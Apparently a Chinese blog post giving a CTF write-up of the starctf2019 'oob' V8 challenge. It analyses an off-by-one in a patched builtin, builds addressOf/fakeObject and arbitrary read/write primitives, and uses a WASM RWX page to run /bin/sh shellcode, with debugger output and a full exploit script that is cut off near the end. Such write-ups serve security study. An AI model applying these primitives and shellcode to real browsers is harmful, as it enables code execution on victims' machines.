https://github.com/avboy1337/1195777-chrome0day\n"},{"title":"starctf2019-oob","url":"/2021/04/21/starctf2019-oob/","content":"starctf2019-oob1、环境复现1、搭建v8调试环境，并下载题目到指定目录（这里需要有v8调试环境搭建的基础，要做好git全局代理和bash全局代理的准备）\n2、还原题目环境\ncd v8git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598\t\t\t\t#设置v8分支gclient syncgit apply ../oob.difftools/dev/gm.py x64.release\n\n2、diff分析diff文件如下，其中主要的逻辑在于kArrayOob的具体实现部分，我直接在该段代码中将重要位置进行注释\ndiff --git a/src/bootstrapper.cc b/src/bootstrapper.ccindex b027d36..ef1002f 100644--- a/src/bootstrapper.cc+++ b/src/bootstrapper.cc@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,                           Builtins::kArrayPrototypeCopyWithin, 2, false);     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,                           Builtins::kArrayPrototypeFill, 1, false);+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,+                          Builtins::kArrayOob,2,false);     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,                           Builtins::kArrayPrototypeFind, 1, false);     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.ccindex 8df340e..9b828ab 100644--- a/src/builtins/builtins-array.cc+++ b/src/builtins/builtins-array.cc@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,   return *final_length; &#125; &#125;  // namespace +BUILTIN(ArrayOob)&#123;+    uint32_t len = args.length();\t\t\t\t\t\t\t\t\t\t\t\t\t+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();\t\t\t\t\t    //指定参数个数大于1的时候返回\t   +    Handle&lt;JSReceiver&gt; receiver;+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(+            isolate, receiver, Object::ToObject(isolate, args.receiver()));+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);\t\t\t\t\t\t   //将receiver对象强转成array对象+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());\t\t\t\t//elements为array对象的elements字段+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());\t\t\t\t//数组长度+    if(len == 1)&#123;+        //read+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));\t\t\t//当参数为空，返回第length个元素的内容+    &#125;else&#123;+        //write+        Handle&lt;Object&gt; value;\t\t\t\t\t\t\t\t\t\t\t\t\t\t+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));+        elements.set(length,value-&gt;Number());\t\t\t\t\t\t\t\t\t\t //当参数为个数为1，就将第一个参数写入到数组中的第length个元素的值+        return ReadOnlyRoots(isolate).undefined_value();+    &#125;+&#125;  BUILTIN(ArrayPush) &#123;   HandleScope scope(isolate);diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.hindex 0447230..f113a81 100644--- a/src/builtins/builtins-definitions.h+++ b/src/builtins/builtins-definitions.h@@ -368,6 +368,7 @@ namespace internal &#123;   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \\   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \\   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \\+  CPP(ArrayOob)                                                                \\                                                                                \\   /* ArrayBuffer */                                                            \\   /* ES #sec-arraybuffer-constructor */                                        \\diff --git a/src/compiler/typer.cc b/src/compiler/typer.ccindex ed1e4a5..c199e3a 100644--- a/src/compiler/typer.cc+++ b/src/compiler/typer.cc@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;       return Type::Receiver();     case Builtins::kArrayUnshift:       return t-&gt;cache_-&gt;kPositiveSafeInteger;+    case Builtins::kArrayOob:+      return Type::Receiver();      // ArrayBuffer functions.     case Builtins::kArrayBufferIsView:\n\n由于创建一个数组长度为length时我们可以访问的是第0到length-1个元素，但是该段代码却直接读取和写入第length个元素，这样就造成了off-by-one。\n验证一下，实际上也和我们的分析是一样的\n\n3、分析利用思路首先编写test.js如下\nvar a = [1,2,3, 1.1];%DebugPrint(a);%SystemBreak();var data = a.oob();console.log(&quot;[*] oob return data:&quot; + data.toString());%SystemBreak();a.oob(2);%SystemBreak();\n\n调试到第一步会给出数组a的object的基址，查看相关job，telescope\ngdb d8set args --allow-natives-syntax test_jscode/test.jsrpwndbg&gt; job 0x0f264d68de490xf264d68de49: [JSArray] - map: 0x3e88cd582ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties] - prototype: 0x1cf103951111 &lt;JSArray[0]&gt; - elements: 0x0f264d68de19 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS] - length: 4 - properties: 0x0f553c540c71 &lt;FixedArray[0]&gt; &#123;    #length: 0x01ac3ca801a9 &lt;AccessorInfo&gt; (const accessor descriptor) &#125; - elements: 0x0f264d68de19 &lt;FixedDoubleArray[4]&gt; &#123;           0: 1           1: 2           2: 3           3: 1.1 &#125;pwndbg&gt; telescope 0x0f264d68de4800:0000│   0xf264d68de48 —▸ 0x3e88cd582ed9 ◂— 0x400000f553c5401\t\t\t\t //map, 注意到这个时候0xf264d68de48位置的值是0x3e88cd582ed901:0008│   0xf264d68de50 —▸ 0xf553c540c71 ◂— 0xf553c5408\t\t\t\t\t//protype02:0010│   0xf264d68de58 —▸ 0xf264d68de19 ◂— 0xf553c5414\t\t\t\t\t//elements, 在该object-0x30的位置上03:0018│   0xf264d68de60 ◂— 0x400000000\t\t\t\t\t\t\t\t\t   //length04:0020│   0xf264d68de68 ◂— 0x0\t\t\t\t\t\t\t\t\t\t\t  //properties... ↓pwndbg&gt; job 0x0f264d68de190xf264d68de19: [FixedDoubleArray] - map: 0x0f553c5414f9 &lt;Map&gt; - length: 4           0: 1           1: 2           2: 3           3: 1.1pwndbg&gt; telescope 0x0f264d68de1800:0000│   0xf264d68de18 —▸ 0xf553c5414f9 ◂— 0xf553c540101:0008│   0xf264d68de20 ◂— 0x40000000002:0010│   0xf264d68de28 ◂— 0x3ff0000000000000\t\t\t\t\t\t\t\t//103:0018│   0xf264d68de30 ◂— 0x4000000000000000\t\t\t\t\t\t\t\t//204:0020│   0xf264d68de38 ◂— 0x4008000000000000\t\t\t\t\t\t\t\t//305:0028│   0xf264d68de40 ◂— 0x3ff199999999999a\t\t\t\t\t\t\t\t//1.1\t\t\t06:0030│   0xf264d68de48 —▸ 0x3e88cd582ed9 ◂— 0x400000f553c540107:0038│   0xf264d68de50 —▸ 0xf553c540c71 ◂— 0xf553c5408\n\n调试到第二步，打印到了0xf264d68de48位置处的值\npwndbg&gt; cContinuing.[*] oob return data:3.3970610731499e-310...\n\n调试到第三步，对0xf264d68de48进行了写入\npwndbg&gt; telescope 0x0f264d68de1800:0000│   0xf264d68de18 —▸ 0xf553c5414f9 ◂— 0xf553c540101:0008│   0xf264d68de20 ◂— 0x40000000002:0010│   0xf264d68de28 ◂— 0x3ff0000000000000\t\t\t\t\t\t\t//103:0018│   0xf264d68de30 ◂— 0x4000000000000000\t\t\t\t\t\t\t//204:0020│   0xf264d68de38 ◂— 0x4008000000000000\t\t\t\t\t\t\t//305:0028│   0xf264d68de40 ◂— 0x3ff199999999999a\t\t\t\t\t\t\t//1.106:0030│   0xf264d68de48 ◂— 0x4000000000000000\t\t\t\t\t\t\t//207:0038│   0xf264d68de50 —▸ 0xf553c540c71 ◂— 0xf553c5408pwndbg&gt; telescope 0x0f264d68de4800:0000│   0xf264d68de48 ◂— 0x4000000000000000\t\t\t\t\t\t\t//2，本来是object的map值，已经被覆盖修改成浮点数的201:0008│   0xf264d68de50 —▸ 0xf553c540c71 ◂— 0xf553c540802:0010│   0xf264d68de58 —▸ 0xf264d68de19 ◂— 0xf553c541403:0018│   0xf264d68de60 ◂— 0x40000000004:0020│   0xf264d68de68 —▸ 0xf553c540561 ◂— 0x200000f553c540105:0028│   0xf264d68de70 —▸ 0x3e88cd582ed9 ◂— 0x400000f553c540106:0030│   0xf264d68de78 —▸ 0xf553c541ea9 ◂— 0x400000f553c540107:0038│   0xf264d68de80 ◂— 0x2800000003pwndbg&gt; job 0x0f264d68de190xf264d68de19: [FixedDoubleArray] - map: 0x0f553c5414f9 &lt;Map&gt; - length: 4           0: 1           1: 2           2: 3           3: 1.1\n\n总结一下，当我们不传参数时，可以泄露object的map字段的值，如果传入参数，传入的参数会写入进object的map字段。\n4、编写addressOf和fakeObject原语what什么叫做addressOf和fakeObject\n\n计算一个对象的地址addressOf：将需要计算内存地址的对象存放到一个对象数组中的A[0]，然后利用上述类型混淆漏洞，将对象数组的Map类型修改为浮点数数组的类型，访问A[0]即可得到浮点数表示的目标对象的内存地址。\n将一个内存地址伪造为一个对象fakeObject：将需要伪造的内存地址存放到一个浮点数数组中的B[0]，然后利用上述类型混淆漏洞，将浮点数数组的Map类型修改为对象数组的类型，那么B[0]此时就代表了以这个内存地址为起始地址的一个JS对象了。\n\n说白了就是一个可以将对象当作地址，一个可以将地址当作对象。我们拿到这个有什么用呢？\nwhy如果我们定义一个FloatArray浮点数数组A，然后定义一个对象数组B。正常情况下，访问A[0]返回的是一个浮点数，访问B[0]返回的是一个对象元素。如果将B的类型修改为A的类型，那么再次访问B[0]时，返回的就不是对象元素B[0]，而是B[0]对象元素转换为浮点数即B[0]对象的内存地址了；如果将A的类型修改为B的类型，那么再次访问A[0]时，返回的就不是浮点数A[0]，而是以A[0]为内存地址的一个JavaScript对象了。\n造成上面的原因在于，v8完全依赖Map类型对js对象进行解析。上面这个逻辑希望能仔细理解一下。\n通过上面两种类型混淆的方式，就能够实现addressOf和fakeObject。\n基于上述分析，如果我们利用oob的读取功能将数组对象A的对象类型Map读取出来，然后利用oob的写入功能将这个类型写入数组对象B，就会导致数组对象B的类型变为了数组对象A的对象类型，这样就造成了类型混淆。\nhow下面我们利用JavaScript实现上述addressOf和fakeObject功能原语。\n首先定义两个全局的Float数组和对象数组，利用oob函数漏洞泄露两个数组的Map类型：\nvar obj = &#123;&quot;a&quot;: 1&#125;;var obj_array = [obj];var float_array = [1.1];var obj_array_map = obj_array.oob();var float_array_map = float_array.oob();\n\n然后实现下面两个函数，下面两个函数就是+1或-1和换map头的过程\naddressOf 泄露某个object的地址\n// 泄露某个object的地址function addressOf(obj_to_leak)&#123;    obj_array[0] = obj_to_leak;\t\t\t\t\t\t\t//将要泄露的对象放到对象数组上    obj_array.oob(float_array_map);\t\t\t\t\t\t//将对象数组的头替换为float数组的头    let obj_addr = f2i(obj_array[0]) - 1n;\t\t\t     //将对象数组的元素的地址泄露。let类型的变量与var类型的变量相比，限定了作用域，let是在块级作用域有效，而var是全局的变量；-1n其实就是-1，因为1是代表对象的标志，-1就是将对象转变为了地址    obj_array.oob(obj_array_map); \t\t\t\t\t\t// 还原array类型以便后续继续使用    return obj_addr;\t\t\t\t\t\t\t\t   //返回的是个float&#125;\n\nfakeObject 将某个addr强制转换为object的对象\n// 将某个addr强制转换为object对象function fakeObject(addr_to_fake)&#123;    float_array[0] = i2f(addr_to_fake + 1n);\t\t\t\t//将地址+1转变为对象    float_array.oob(obj_array_map);\t\t\t\t\t\t   //将float数组的头替换为对象数组的头    let faked_obj = float_array[0];\t\t\t\t\t\t   //将对象变量返回    float_array.oob(float_array_map); \t\t\t\t\t   // 还原array类型以便后续继续使用    return faked_obj;\t\t\t\t\t\t\t\t\t //返回的是个对象&#125;\n\n定义一些gadget，简单的工具代码\n// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××var buf =new ArrayBuffer(16);var float64 = new Float64Array(buf);var bigUint64 = new BigUint64Array(buf);// 浮点数转换为64位无符号整数function f2i(f)&#123;    float64[0] = f;    return bigUint64[0];&#125;// 64位无符号整数转为浮点数function i2f(i)&#123;    bigUint64[0] = i;    return float64[0];&#125;// 64位无符号整数转为16进制字节串function hex(i)&#123;    return i.toString(16).padStart(16, &quot;0&quot;);&#125;%DebugPrint(float64);%DebugPrint(bigUint64);%SystemBreak();\n\n5、构造任意读写原语上面已经将地址转对象和对象转地址的原语构造出来了，现在我们需要利用这两个原语来构造任意地址读写\n我们现在有如下的思路：\n1、fakeObject可以将给定的内存地址转变为object，我们可以在这块地址上面构造object的结构体，然后利用fakeObject将其转化为object\n2、由于这块object完全是我们构造的，所以其中的任何字段都是我们可控的，包括elements字段\n3、我们已经知道elements实际上是个指针，指向elements这个object对象的地址，当我们操作数组元素时，其实操作的就是从elements对象地址+0x10的内存，我们有这样一个思路：将elements位置处的值覆盖为任意地址，这样我们操作数组元素时，操作的就是这块写的任意地址的内存。\n我们直接通过任意读写原语来具体说明下上述过程\nvar fake_array = [\t\t\t\t\t\t\t\t\t\t\t \t // [+0x40]    float_array_map,    i2f(0n),    i2f(0x41414141n),    i2f(0x1000000000n),    1.1,    2.2,];var fake_array_addr = addressOf(fake_array);\t\t\t\t\t\t// +0x40var fake_object_addr = fake_array_addr - 0x40n + 0x10n;\t\t\t\t // +0x10var fake_object = fakeObject(fake_object_addr);\t\t\t\t\t\t// [+0x10]function read64(addr)\t\t\t\t\t\t\t\t\t\t\t  &#123;    fake_array[2] = i2f(addr - 0x10n + 0x1n);\t\t\t\t\t\t//fake_array[2] == [[+0x40+0x10]+0x10+0x10] == 0x00+0x10+0x10 == 0x20, +0x40++0x10为element的地址，[+0x40+0x10]为element对象，第一个+0x10为element的第[0]个元素，第二个+0x10为element的第[2]个元素,该地址存放的值为i2f(addr - 0x10n + 0x1n)。    let leak_data = f2i(fake_object[0]);\t\t\t\t\t\t\t//fake_object[0] == [[+0x10+0x10]+0x10] == [[+0x20]+0x10] == [addr-0x10+0x1+0x10] == [addr+0x1]    console.log(&quot;[*] leak from: 0x&quot; +hex(addr) + &quot;: 0x&quot; + hex(leak_data));    return leak_data;&#125;function write64(addr, data)&#123;    fake_array[2] = i2f(addr - 0x10n + 0x1n);\t\t\t\t\t\t    fake_object[0] = i2f(data);    console.log(&quot;[*] write to : 0x&quot; +hex(addr) + &quot;: 0x&quot; + hex(data));    &#125;\n\n描述下上面创建的具体的内存结构\n+0x0\telements_map\t\t    //elements_start+0x8\telements_length+0x10\tfloat_array_map\t\t\t//fake_array[0]; fake_object_addr+0x18 \ti2f(0n)\t\t\t\t    //fake_array[1]+0x20\ti2f(0x41414141n)\t\t//fake_array[2]\t\t\t//elements对象+0x28\ti2f(0x1000000000n)\t\t//fake_array[3]+0x30\t1.1\t\t\t\t\t   //fake_array[4]+0x38\t2.2\t\t\t\t\t   //fake_array[5]+0x40\tmap\t\t\t\t\t   //fake_array_addr+0x48\tprototype+0x50\telements\t\t\t\t//value == +0x0+0x58\tlength+0x60\tproperties\n\n然后在v8中进行调试\nvar a = [1.1, 2.2, 3.3];%DebugPrint(a);var a_addr = addressOf(a);console.log(&quot;[*] addressOf a: 0x&quot; + hex(a_addr));read64(a_addr);%SystemBreak();write64(a_addr, 0x01020304n);%SystemBreak();\n\n输出结果如下：\npwndbg&gt; r...0x1f8b3558fa61 &lt;JSArray[3]&gt;[*] addressOf a: 0x00001f8b3558fa60[*] leak from: 0x00001f8b3558fa60: 0x00003f510acc2ed9...pwndbg&gt; telescope 0x00001f8b3558fa6000:0000│   0x1f8b3558fa60 —▸ 0x3f510acc2ed9 ◂— 0x4000001989b3c01\t\t\t//可以看到将0x1f8b3558fa60处的值0x3f510acc2ed9读取出来了01:0008│   0x1f8b3558fa68 —▸ 0x1989b3c0c71 ◂— 0x1989b3c0802:0010│   0x1f8b3558fa70 —▸ 0x1f8b3558fa39 ◂— 0x1989b3c1403:0018│   0x1f8b3558fa78 ◂— 0x30000000004:0020│   0x1f8b3558fa80 —▸ 0x1989b3c0561 ◂— 0x2000001989b3c0105:0028│   0x1f8b3558fa88 —▸ 0x1f8b3558fa61 ◂— 0x7100003f510acc2e06:0030│   0x1f8b3558fa90 —▸ 0x1989b3c13b9 ◂— 0x1989b3c0107:0038│   0x1f8b3558fa98 ◂— 0x2pwndbg&gt; cContinuing.[*] write to : 0x00001f8b3558fa60: 0x0000000001020304...pwndbg&gt; telescope 0x00001f8b3558fa6000:0000│   0x1f8b3558fa60 ◂— 0x1020304\t\t\t\t\t\t\t\t\t//0x1f8b3558fa60处的值被修改为0x000000000102030401:0008│   0x1f8b3558fa68 —▸ 0x1989b3c0c71 ◂— 0x1989b3c0802:0010│   0x1f8b3558fa70 —▸ 0x1f8b3558fa39 ◂— 0x1989b3c1403:0018│   0x1f8b3558fa78 ◂— 0x30000000004:0020│   0x1f8b3558fa80 —▸ 0x1989b3c0561 ◂— 0x2000001989b3c0105:0028│   0x1f8b3558fa88 —▸ 0x1f8b3558fa61 ◂— 0x710000000001020306:0030│   0x1f8b3558fa90 —▸ 0x1989b3c13b9 ◂— 0x1989b3c0107:0038│   0x1f8b3558fa98 ◂— 0x2    \n\n6、利用思路归纳题目的利用思路有两种，一种是通过常规的堆漏洞利用方式，另一种是js引擎漏洞特有的义中叫做wasm的利用方式\n在传统堆漏洞的pwn中，利用过程如下（因为在我们的浏览器中，已经实现了任意地址读写的漏洞效果，所以这个传统的利用思路在v8中也同样适用）\n\n通过堆漏洞能够实现一个任意地址写的效果\n结合程序功能和UAF漏洞泄露出一个libc地址\n通过泄露的libc地址计算出free_hook、malloc_hook、system和one_gadget的内存地址\n利用任意地址写将hook函数修改为System或one_gadget的地址，从而实现shell的执行\n\n另外在v8中还有一种被称为webassembly即wasm的技术。通俗来讲，v8可以直接执行其它高级语言生成的机器码，从而加快运行效率。存储wasm的内存页是RWX可读可写可执行的，因此我们还可以通过下面的思路执行我们的shellcode：\n\n利用webassembly构造一块RWX内存页\n通过漏洞将shellcode覆写到原本属于webassembly机器码的内存页中\n后续再调用webassembly函数接口时，实际上就触发了我们部署好的shellcode\n\nwasm详细见下面的文章，讲的很好：\nhttps://www.jianshu.com/p/bff8aa23fe4d\n7、WASM方式进行漏洞利用简单用法wasm即webassembly，可以让JavaScript直接执行高级语言生成的机器码。\n在线编译网站：https://wasdk.github.io/WasmFiddle/\n可以直接通过示例来进行，点击左下角选择Code Buffer，之后正上方build，之后正上方run，之后右下方就会显示出执行结果：\n\n这样有种猜测，是不是可以直接写调用命令，直接转换为WASM码，js引擎直接执行，后来发现这种方式是不行的，报告脚本错误\n\n利用wasm执行shellcodewasm的作用是将一段功能转换为机器码，实际上wasm是一段AST字节码，之后通过运行wasm这一段字节码将高级语言转换为机器码，也就是说，wasm的功能可以理解为编译功能，wasm的代码和它”编译“生成的机器码的位置是不一样的\n所以我们有这样的一种方式：\n1、首先通过wasm生成一段tmpcode\n2、通过addressOf原语找到存放wasm的内存地址\n3、通过任意地址写原语用shellcode替换原本的tmpcode\n4、最后调用之前的tmpcode功能即可触发shellcode\n寻找\npwndbg&gt; rStarting program: /root/browser_study/v8/v8/v8/out/x64.release/d8 --allow-natives-syntax ./poc.js...[*] leak wasm func addr: 0x000005b5f06a1b60pwndbg&gt; job 0x000005b5f06a1b610x5b5f06a1b61: [Function] in OldSpace - map: 0x02b1b4a04379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties] - prototype: 0x05b5f0682109 &lt;JSFunction (sfi = 0x146242243b29)&gt; - elements: 0x129784b00c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS] - function prototype: &lt;no-prototype-slot&gt; - shared_info: 0x05b5f06a1b29 &lt;SharedFunctionInfo 0&gt; - name: 0x129784b04ae1 &lt;String[#1]: 0&gt; - formal_parameter_count: 0 - kind: NormalFunction - context: 0x05b5f0681869 &lt;NativeContext[246]&gt; - code: 0x027534f82001 &lt;Code JS_TO_WASM_FUNCTION&gt; - WASM instance 0x5b5f06a1969 - WASM function index 0 - properties: 0x129784b00c71 &lt;FixedArray[0]&gt; &#123;    #length: 0x1462422404b9 &lt;AccessorInfo&gt; (const accessor descriptor)    #name: 0x146242240449 &lt;AccessorInfo&gt; (const accessor descriptor)    #arguments: 0x146242240369 &lt;AccessorInfo&gt; (const accessor descriptor)    #caller: 0x1462422403d9 &lt;AccessorInfo&gt; (const accessor descriptor) &#125; - feedback vector: not availablepwndbg&gt; job 0x05b5f06a1b290x5b5f06a1b29: [SharedFunctionInfo] in OldSpace - map: 0x129784b009e1 &lt;Map[56]&gt; - name: 0x129784b04ae1 &lt;String[#1]: 0&gt; - kind: NormalFunction - function_map_index: 144 - formal_parameter_count: 0 - expected_nof_properties: 0 - language_mode: sloppy - data: 0x05b5f06a1b01 &lt;WasmExportedFunctionData&gt; - code (from data): 0x027534f82001 &lt;Code JS_TO_WASM_FUNCTION&gt; - function token position: -1 - start position: -1 - end position: -1 - no debug info - scope info: 0x129784b00c61 &lt;ScopeInfo[0]&gt; - length: 0 - feedback_metadata: 0x129784b02a39: [FeedbackMetadata] - map: 0x129784b01319 &lt;Map&gt; - slot_count: 0pwndbg&gt; job 0x05b5f06a1b010x5b5f06a1b01: [WasmExportedFunctionData] in OldSpace - map: 0x129784b05879 &lt;Map[40]&gt; - wrapper_code: 0x027534f82001 &lt;Code JS_TO_WASM_FUNCTION&gt; - instance: 0x05b5f06a1969 &lt;Instance map = 0x2b1b4a09789&gt; - function_index: 0pwndbg&gt; job 0x05b5f06a19690x5b5f06a1969: [WasmInstanceObject] in OldSpace - map: 0x02b1b4a09789 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties] - prototype: 0x031ac750ac19 &lt;Object map = 0x2b1b4a0ac79&gt; - elements: 0x129784b00c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS] - module_object: 0x031ac75101e1 &lt;Module map = 0x2b1b4a091e9&gt; - exports_object: 0x031ac7510451 &lt;Object map = 0x2b1b4a0adb9&gt; - native_context: 0x05b5f0681869 &lt;NativeContext[246]&gt; - memory_object: 0x05b5f06a1a91 &lt;Memory map = 0x2b1b4a0a189&gt; - table 0: 0x031ac75103e9 &lt;Table map = 0x2b1b4a09aa9&gt; - imported_function_refs: 0x129784b00c71 &lt;FixedArray[0]&gt; - managed_native_allocations: 0x031ac7510391 &lt;Foreign&gt; - memory_start: 0x7f9336540000 - memory_size: 65536 - memory_mask: ffff - imported_function_targets: 0x55977a6fa3f0 - globals_start: (nil) - imported_mutable_globals: 0x55977a6f9fd0 - indirect_function_table_size: 0 - indirect_function_table_sig_ids: (nil) - indirect_function_table_targets: (nil) - properties: 0x129784b00c71 &lt;FixedArray[0]&gt; &#123;&#125;pwndbg&gt; telescope 0x05b5f06a1968+0x8800:0000│   0x5b5f06a19f0 —▸ 0x20bf51557000 ◂— movabs r10, 0x20bf51557260 /* 0x20bf51557260ba49 */01:0008│   0x5b5f06a19f8 —▸ 0x31ac75101e1 ◂— 0x71000002b1b4a09102:0010│   0x5b5f06a1a00 —▸ 0x31ac7510451 ◂— 0x71000002b1b4a0ad03:0018│   0x5b5f06a1a08 —▸ 0x5b5f0681869 ◂— 0x129784b00f04:0020│   0x5b5f06a1a10 —▸ 0x5b5f06a1a91 ◂— 0x71000002b1b4a0a105:0028│   0x5b5f06a1a18 —▸ 0x129784b004d1 ◂— 0x129784b005... ↓pwndbg&gt; vmmap 0x20bf51557000LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA    0x20bf51557000     0x20bf51558000 rwxp     1000 0       +0x0\n\n根据上面的思路，写出泄露RWX内存页起始地址的JS代码如下所示：\nvar shared_info_addr = read64(f_addr + 0x18n) - 0x1n;var wasm_exported_func_data_addr = read64(shared_info_addr + 0x8n) - 0x1n;var wasm_instance_addr = read64(wasm_exported_func_data_addr + 0x10n) - 0x1n;var rwx_page_addr = read64(wasm_instance_addr + 0x88n);\t\t\t\t\t//这里面的偏移在不同版本的v8中可能不同，不过只要在调试的过程中按照Function--&gt;shared_info--&gt;WasmExportedFunctionData--&gt;instance的调用关系确定偏移，最后telescope查看instance的内存就好了console.log(&quot;[*] leak rwx_page_addr: 0x&quot; + hex(rwx_page_addr));\n\ngdb结果如下\npwndbg&gt; rStarting program: /root/browser_study/v8/v8/v8/out/x64.release/d8 --allow-natives-syntax ./poc.js[Thread debugging using libthread_db enabled]Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.[New Thread 0x7ff37b27e700 (LWP 2610828)][New Thread 0x7ff37aa7d700 (LWP 2610829)][New Thread 0x7ff37a27c700 (LWP 2610830)][*] leak wasm func addr: 0x000033dad08a2018[*] leak from: 0x000033dad08a2030: 0x000033dad08a1fe1[*] leak from: 0x000033dad08a1fe8: 0x000033dad08a1fb9[*] leak from: 0x000033dad08a1fc8: 0x000033dad08a1e21[*] leak from: 0x000033dad08a1ea8: 0x00002c90fe47c000[*] leak rwx_page_addr: 0x00002c90fe47c000\n\n这样我们成功的泄露出了rwx内存页的起始地址\n后续只要利用任意地址写write64原语我们的shellcode写入这个rwx页，然后调用wasm函数接口即可触发我们的shellcode了，具体实现如下所示：\n/* /bin/sh for linux x64 char shellcode[] = &quot;\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f \\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53 \\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05&quot;;*/var shellcode = [    0x2fbb485299583b6an,    0x5368732f6e69622fn,    0x050f5e5457525f54n];var data_buf = new ArrayBuffer(24);var data_view = new DataView(data_buf);var buf_backing_store_addr = addressOf(data_buf) + 0x20n;write64(buf_backing_store_addr, rwx_page_addr);  //这里写入之前泄露的rwx_page_addr地址data_view.setFloat64(0, i2f(shellcode[0]), true);data_view.setFloat64(8, i2f(shellcode[1]), true);data_view.setFloat64(16, i2f(shellcode[2]), true);f();\n\n\n最终运行结果如下\nroot@ubuntu:~/browser_study/v8/v8/v8/out/x64.release# ./d8 exp.js[*] leak wasm func addr: 0x0000388ba6d624a0[*] leak from: 0x0000388ba6d624b8: 0x0000388ba6d62469[*] leak from: 0x0000388ba6d62470: 0x0000388ba6d62441[*] leak from: 0x0000388ba6d62450: 0x0000388ba6d622a9[*] leak from: 0x0000388ba6d62330: 0x00003a7d7595f000[*] leak rwx_page_addr: 0x00003a7d7595f000[*] write to : 0x000008913e091668: 0x00003a7d7595f000# whoamiroot\n\n完整exp如下x64如下// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××var buf =new ArrayBuffer(16);var float64 = new Float64Array(buf);var bigUint64 = new BigUint64Array(buf);// 浮点数转换为64位无符号整数function f2i(f)&#123;    float64[0] = f;    return bigUint64[0];&#125;// 64位无符号整数转为浮点数function i2f(i)&#123;    bigUint64[0] = i;    return float64[0];&#125;// 64位无符号整数转为16进制字节串function hex(i)&#123;    return i.toString(16).padStart(16, &quot;0&quot;);&#125;// ××××××××2. addressOf和fakeObject的实现××××××××var obj = &#123;&quot;a&quot;: 1&#125;;var obj_array = [obj];var float_array = [1.1];var obj_array_map = obj_array.oob();var float_array_map = float_array.oob();// 泄露某个object的地址function addressOf(obj_to_leak)&#123;    obj_array[0] = obj_to_leak;    obj_array.oob(float_array_map);    let obj_addr = f2i(obj_array[0]) - 1n;    obj_array.oob(obj_array_map); // 还原array类型，以便后续继续使用    return obj_addr;&#125;// 将某个addr强制转换为object对象function fakeObject(addr_to_fake)&#123;    float_array[0] = i2f(addr_to_fake + 1n);    float_array.oob(obj_array_map);    let faked_obj = float_array[0];    float_array.oob(float_array_map); // 还原array类型，以便后续继续使用    return faked_obj;&#125;var fake_array = [    float_array_map,    i2f(0n),    i2f(0x41414141n),    i2f(0x1000000000n),    1.1,    2.2,];var fake_array_addr = addressOf(fake_array);var fake_object_addr = fake_array_addr - 0x40n + 0x10n;var fake_object = fakeObject(fake_object_addr);function read64(addr)&#123;    fake_array[2] = i2f(addr - 0x10n + 0x1n);    let leak_data = f2i(fake_object[0]);    console.log(&quot;[*] leak from: 0x&quot; +hex(addr) + &quot;: 0x&quot; + hex(leak_data));    return leak_data;&#125;function write64(addr, data)&#123;    fake_array[2] = i2f(addr - 0x10n + 0x1n);    fake_object[0] = i2f(data);    console.log(&quot;[*] write to : 0x&quot; +hex(addr) + &quot;: 0x&quot; + hex(data));    &#125;var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule);var f = wasmInstance.exports.main;var f_addr = addressOf(f);console.log(&quot;[*] leak wasm func addr: 0x&quot; + hex(f_addr));var shared_info_addr = read64(f_addr + 0x18n) - 0x1n;var wasm_exported_func_data_addr = read64(shared_info_addr + 0x8n) - 0x1n;var wasm_instance_addr = read64(wasm_exported_func_data_addr + 0x10n) - 0x1n;var rwx_page_addr = read64(wasm_instance_addr + 0x88n);console.log(&quot;[*] leak rwx_page_addr: 0x&quot; + hex(rwx_page_addr));var data_buf = new ArrayBuffer(0x100);var data_view = new DataView(data_buf);var buf_backing_store_addr = addressOf(data_buf) + 0x20n;write64(buf_backing_store_addr, rwx_page_addr);//msfvenom -p linux/x64/exec CMD=whoami -f numvar shellcode1 = [0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 